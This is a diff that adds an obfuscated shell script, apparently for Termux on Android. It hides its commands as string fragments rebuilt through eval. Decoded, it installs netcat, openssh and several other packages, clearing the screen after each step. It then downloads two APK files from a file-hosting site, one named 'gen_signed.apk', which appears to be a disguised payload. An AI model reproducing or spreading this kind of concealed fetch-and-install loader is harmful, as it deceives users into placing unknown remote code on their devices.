@@ -1,0 +1,3 @@
+z="
+";kz='cuwk';cz='brzi';qz='pi.a';hz='sign';Dz='open';Iz='irss';Tz='wget';sz='ile';Mz='y';oz='Term';Gz='clea';nz='dcx/';dz='8s00';Lz='at -';mz='necd';Rz='weec';Kz='netc';Uz=' htt';Qz='pi -';Pz='ux-a';gz='gen_';Sz='hat ';Ez='sll ';Hz='r';rz='pk/f';ez='mk6x';Oz='term';fz='1iu/';Jz='i -y';pz='ux+a';lz='086m';Fz='-y';Xz='.med';Zz='re.c';Yz='iafi';bz='ile/';Nz='ssh ';Wz='/www';Cz='all ';Bz='inst';Az='pkg ';jz='pk';iz='ed.a';az='om/f';Vz='ps:/';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$z$Gz$Hz$z$Az$Bz$Cz$Iz$Jz$z$Gz$Hz$z$Az$Bz$Cz$Kz$Lz$Mz$z$Gz$Hz$z$Az$Bz$Cz$Dz$Nz$Fz$z$Gz$Hz$z$Az$Bz$Cz$Oz$Pz$Qz$Mz$z$Gz$Hz$z$Az$Bz$Cz$Rz$Sz$Fz$z$Gz$Hz$z$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$z$Gz$Hz$z$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$kz$lz$mz$nz$oz$pz$qz$rz$sz"
